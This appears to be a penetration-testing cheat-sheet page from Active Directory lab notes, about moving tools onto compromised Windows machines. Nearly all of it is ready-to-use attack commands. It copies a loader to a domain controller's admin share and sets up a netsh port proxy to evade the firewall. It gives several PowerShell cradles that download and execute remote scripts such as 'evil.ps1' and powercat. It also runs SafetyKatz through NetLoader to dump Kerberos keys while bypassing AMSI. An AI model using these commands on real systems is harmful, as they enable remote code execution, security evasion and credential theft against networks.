# Transfer files

### SMB Shares

```batch
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y 
```

### HTTP Server

Port forward to avoid firewall using netsh on target machine

```batch
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
```

Serve the files using [hfs ](https://www.rejetto.com/hfs/?f=dl)or http simple server

```batch
python3 -m http.server -port 80
```

Download the file on target machine

```powershell
# Download and store
(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/<File>', '<Dest Path>')

# Download and execute
iex ((New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/<File>'));

# NetLoader to execute and bypass amsi
NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

More options

{% code overflow="wrap" %}
```powershell
# Internet Explorer Downoad cradle
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response


$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()


$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```
{% endcode %}

PowerShell v3+

```powershell
iex (iwr http://172.16.100.83/powercat.ps1 -UseBasicParsing)
iex (iwr 'http://192.168.230.1/evil.ps1')
```
